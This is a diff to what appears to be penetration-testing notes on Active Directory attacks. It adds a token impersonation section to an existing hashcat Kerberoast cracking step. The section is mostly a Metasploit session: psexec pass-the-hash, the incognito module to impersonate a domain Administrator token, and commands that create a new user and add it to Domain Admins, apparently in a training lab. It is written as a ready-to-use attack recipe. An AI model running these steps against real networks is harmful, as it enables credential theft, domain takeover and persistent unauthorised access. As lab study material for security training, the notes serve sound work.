@@ -34,3 +34,46 @@ crack hash :
 ```bash
 hashcat -m 13100 GetUserSPNs1.out /usr/share/wordlists/rockyou.txt.gz 
 ```
+
+### Token Impersonation :
+
+Temporary keys that allow you access to a system/network without having to provide credentials each time you access a file. Think cookies for computers.
+
+- Delegate - Created for logging into a machine or using Remote Desktop
+-  Impersonate - "non-interactive" such as attaching a network drive or a domain logon script
+
+
+Compromise the machine in domain to see if Administrator logins to that machine if yes perform this attack :
+
+```bash
+#use pass the hash to get the shell
+msf6 exploit(windows/smb/psexec) > run
+meterpreter > load incognito 
+meterpreter > list_tokens -u
+
+Delegation Tokens Available
+========================================
+Font Driver Host\UMFD-0
+Font Driver Host\UMFD-5
+MARVEL\Administrator
+NT AUTHORITY\LOCAL SERVICE
+NT AUTHORITY\NETWORK SERVICE
+NT AUTHORITY\SYSTEM
+Window Manager\DWM-5
+
+meterpreter > impersonate_token MARVEL\Administrator
+meterpreter > shell
+C:\Windows\system32>whoami
+whoami
+marvel\administrator
+
+C:\Windows\system32>net user /add hawkeye Password123 /domain
+net user /add hawkeye Password123 /domain
+
+C:\Windows\system32>net group "Domain Admins" hawkeye /ADD /DOMAIN
+net group "Domain Admins" hawkeye /ADD /DOMAIN
+
+
+
+
+```
